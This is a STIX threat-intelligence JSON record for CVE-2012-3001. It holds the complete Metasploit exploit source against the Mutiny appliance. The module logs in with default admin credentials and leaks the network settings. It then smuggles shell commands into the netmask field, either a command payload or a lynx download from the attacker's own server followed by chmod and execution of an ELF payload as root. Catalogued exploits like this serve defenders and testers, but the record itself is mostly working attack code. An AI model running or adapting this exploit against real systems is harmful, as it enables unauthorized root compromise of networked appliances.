{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f79bfacd-fe24-4cf0-848f-9e0c1757ed79",
    "created": "2024-08-14T17:08:37.092072Z",
    "modified": "2024-08-14T17:08:37.092076Z",
    "name": "Mutiny Remote Command Execution",
    "description": " This module exploits an authenticated command injection vulnerability in the Mutiny appliance. Versions prior to 4.5-1.12 are vulnerable. In order to exploit the vulnerability the mutiny user must have access to the admin interface. The injected commands are executed with root privileges. This module has been tested successfully on Mutiny 4.2-1.05. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/mutiny_subnetmask_exec.rb",
            "external_id": "mutiny_subnetmask_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-3001"
        },
        {
            "source_name": "reference",
            "url": "http://obscuresecurity.blogspot.com.es/2012/10/mutiny-command-injection-and-cve-2012.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mutiny Remote Command Execution',\n      'Description'    => %q{\n          This module exploits an authenticated command injection vulnerability in the\n        Mutiny appliance. Versions prior to 4.5-1.12 are vulnerable. In order to exploit\n        the vulnerability the mutiny user must have access to the admin interface. The\n        injected commands are executed with root privileges. This module has been tested\n        successfully on Mutiny 4.2-1.05.\n      },\n      'Author'         =>\n        [\n          'Christopher Campbell', # Vulnerability discovery\n          'juan vazquez'          # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2012-3001'],\n          ['OSVDB', '86570'],\n          ['BID', '56165'],\n          ['US-CERT-VU', '841851'],\n          ['URL', 'http://obscuresecurity.blogspot.com.es/2012/10/mutiny-command-injection-and-cve-2012.html']\n        ],\n      'Privileged'     => true,\n      'Platform'       => %w{ linux unix },\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 4000\n        },\n      'Targets'        =>\n        [\n          [ 'Unix CMD',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              #'Payload'        =>\n              #\t{\n              #\t\t'Compat'   =>\n              #\t\t\t{\n              #\t\t\t\t'PayloadType' => 'cmd',\n              #\t\t\t\t'RequiredCmd' => 'python'\n              #\t\t\t}\n              #\t},\n            }\n          ],\n          [ 'Linux Payload',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'DisclosureDate' => '2012-10-22',\n      'DefaultTarget' => 1))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The base path to Mutiny', '/interface/' ]),\n        OptString.new('USERNAME', [ true, 'The user to authenticate as', 'admin' ]),\n        OptString.new('PASSWORD', [ true, 'The password to authenticate with', 'mutiny' ])\n      ])\n\n    self.needs_cleanup = true\n  end\n\n  def lookup_lhost()\n    # Get the source address\n    if datastore['SRVHOST'] == '0.0.0.0'\n      Rex::Socket.source_address('50.50.50.50')\n    else\n      datastore['SRVHOST']\n    end\n  end\n\n  def on_new_session(session)\n    cmds = []\n    cmds = [\n      %Q|echo #{@netmask_eth0} > /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask|,\n      %Q|tr -d \"\\\\n\\\\r\" < /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask > /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask.bak|,\n      %Q|mv -f /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask.bak /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask|,\n      %Q|sed -e s/NETMASK=.*/NETMASK=#{@netmask_eth0}/ ifcfg-eth0 > ifcfg-eth0.bak|,\n      %Q|mv -f ifcfg-eth0.bak ifcfg-eth0|,\n      %Q|/etc/init.d/network restart|\n    ] if @netmask_eth0\n    cmds << %Q|rm /tmp/#{@elfname}.elf| unless target.name =~ /CMD/\n\n    print_status(\"Restoring Network Information and Cleanup...\")\n    begin\n      session.shell_command_token(cmds.join(\" ; \"))\n    rescue\n      print_error(\"Automatic restore and cleanup didn't work, please use these commands:\")\n      cmds.each { |cmd|\n        print_warning(cmd)\n      }\n    end\n    print_good(\"Restoring and Cleanup successful\")\n  end\n\n  def start_web_service\n    print_status(\"Setting up the Web Service...\")\n\n    if datastore['SSL']\n      ssl_restore = true\n      datastore['SSL'] = false\n    end\n\n    resource_uri = '/' + @elfname + '.elf'\n    service_url = \"http://#{lookup_lhost}:#{datastore['SRVPORT']}#{resource_uri}\"\n\n    print_status(\"Starting up our web service on #{service_url} ...\")\n    start_service({'Uri' => {\n      'Proc' => Proc.new { |cli, req|\n        on_request_uri(cli, req)\n      },\n      'Path' => resource_uri\n    }})\n    datastore['SSL'] = true if ssl_restore\n\n    return service_url\n  end\n\n  # wait for the data to be sent\n  def wait_linux_payload\n    print_status(\"Waiting for the victim to request the ELF payload...\")\n\n    waited = 0\n    while (not @elf_sent)\n      select(nil, nil, nil, 1)\n      waited += 1\n      if (waited > datastore['HTTP_DELAY'])\n        fail_with(Failure::Unknown, \"Target didn't request request the ELF payload -- Maybe it cant connect back to us?\")\n      end\n    end\n\n    #print_status(\"Giving time to the payload to execute...\")\n    #select(nil, nil, nil, 20) unless session_created?\n  end\n\n  # Handle incoming requests from the target\n  def on_request_uri(cli, request)\n    vprint_status(\"on_request_uri called, #{request} requested\")\n\n    if (not @elf_data)\n      print_error(\"A request came in, but the ELF archive wasn't ready yet!\")\n      return\n    end\n\n    print_good(\"Sending the ELF payload to the target...\")\n    @elf_sent = true\n    send_response(cli, @elf_data)\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'logon.jsp'),\n    })\n\n    if res and res.body =~ /: Mutiny : Login @ mutiny/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    print_status(\"Login with the provided credentials...\")\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'logon.do'),\n      'vars_post' =>\n      {\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      }\n    })\n\n    if res and res.code == 302 and res.headers['Location'] =~ /index.do/ and res.get_cookies =~ /JSESSIONID=(.*);/\n      print_good(\"Login Successful\")\n      session = $1\n    else\n      fail_with(Failure::NoAccess, \"#{peer} - Unable to login in Mutiny\")\n    end\n\n    print_status(\"Leaking current Network Information...\")\n\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, 'admin', 'cgi-bin', 'netconfig'),\n      'cookie'    => \"JSESSIONID=#{session}\",\n    })\n\n    if res and res.code == 200 and res.body =~ /Ethernet Interfaces/\n      address_eth0 = (res.body =~ /<input type=\"text\" value=\"(.*)\" name=\"addresseth0\" class=\"textInput\" \\/>/ ? $1 : \"\")\n      @netmask_eth0 = (res.body =~ /<input type=\"text\" value=\"(.*)\" name=\"netmasketh0\" class=\"textInput\" \\/>/ ? $1 : \"\")\n      gateway = (res.body =~ /<input type=\"text\" name=\"Gateway\" value= \"(.*)\" class=\"textInput\">/ ? $1 : \"\")\n      dns_address = (res.body =~ /<input type=\"text\" value=\"(.*)\" name=\"dnsaddress0\" class=\"textInput\">/ ? $1 : \"\")\n      static_route_address = (res.body =~ /<input class=\"textInput\" type=\"text\" name=\"staticRouteAddress\" value=\"(.*)\" \\/>/ ? $1 : \"\")\n      static_route_netmask = (res.body =~ /<input class=\"textInput\" type=\"text\" name=\"staticRouteNetmask\" value=\"(.*)\" \\/>/ ? $1 : \"\")\n      static_route_gateway = (res.body =~ /<input class=\"textInput\" type=\"text\" name=\"staticRouteGateway\" value=\"(.*)\" \\/>/ ? $1 : \"\")\n      print_good(\"Information leaked successfully\")\n    else\n      print_error(\"Error leaking information, trying to exploit with random values\")\n    end\n\n    if target.name =~ /CMD/\n      injection = @netmask_eth0.dup || rand_text_alpha(5 + rand(3))\n      injection << \"; #{payload.encoded}\"\n    else\n      print_status(\"Generating the ELF Payload...\")\n      @elf_data = generate_payload_exe\n      @elfname = Rex::Text.rand_text_alpha(3+rand(3))\n      service_url = start_web_service\n      injection = @netmask_eth0.dup || rand_text_alpha(5 + rand(3))\n      injection << \"; lynx -source \\\"#{service_url}\\\" > /tmp/#{@elfname}.elf\"\n      injection << \"; chmod +x /tmp/#{@elfname}.elf\"\n      injection << \"; /tmp/#{@elfname}.elf\"\n\n    end\n\n    print_status(\"Exploiting Command Injection...\")\n\n    send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'admin', 'cgi-bin', 'netconfig'),\n      'cookie'    => \"JSESSIONID=#{session}\",\n      'vars_post' =>\n      {\n        \"addresseth0\" => address_eth0 || rand_text_alpha(5 + rand(3)),\n        \"netmasketh0\" => injection,\n        \"Gateway\" => gateway || rand_text_alpha(5 + rand(3)),\n        \"dnsaddress0\" => dns_address || rand_text_alpha(5 + rand(3)),\n        \"staticRouteAddress\" => static_route_address || rand_text_alpha(5 + rand(3)),\n        \"staticRouteNetmask\" => static_route_netmask || rand_text_alpha(5 + rand(3)),\n        \"staticRouteGateway\" => static_route_gateway || rand_text_alpha(5 + rand(3))\n      }\n    }, 1)\n\n    if target.name =~ /Linux Payload/\n      wait_linux_payload\n    end\n  end\n\n\n\nend\n",
    "x_mitre_disclosure_date": "2012-10-22",
    "x_mitre_platforms": [
        "linux"
    ]
}